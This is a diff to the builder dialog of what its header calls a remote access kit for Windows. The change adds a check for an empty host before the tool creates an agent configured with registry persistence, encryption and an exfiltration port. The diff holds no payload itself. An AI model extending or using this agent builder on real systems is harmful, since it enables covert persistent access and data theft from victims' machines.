@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 from ..logging.logging import DNSconfigs,NetworkingConfigs
 from ..builder.agent_builder import Builder
@@ -43,12 +43,19 @@ class Ui_builder_dialog(object):
         if reg_key == '':                                                   #If reg key is stil empty string,
             ErrorHandling().raise_error('Persistence option required.','','Build Failure') #Raise error
             return                                                           #Return back to calling function
+
         else:
-            #If no error, parse host option and then create the agent
-            host = NicHandler().validate_host(self.host_combobox.currentText()) #Validate the host
-            Builder().create_agent(
-                self.port_input.text(), self.stream_port_input.text(), self.exfil_port_input.text(),
-                host, self.file_name_input.text(),reg_key,perst_option,encryption_option) #
+
+            host = NicHandler().validate_host(self.host_combobox.currentText()) #Get the IP string if local or public has been selected
+            if host == '':      #If an empty string is returned,
+                ErrorHandling().raise_error('Error building agent', #Raise error
+                                            'Host not valid',
+                                            'Build Failure')
+            #else, if no error, parse options and create agent
+            else:
+                Builder().create_agent(
+                    self.port_input.text(), self.stream_port_input.text(), self.exfil_port_input.text(),
+                    host, self.file_name_input.text(),reg_key,perst_option,encryption_option) #
 
     def setupUi(self, builder_dialog):
         builder_dialog.setObjectName("builder_dialog")
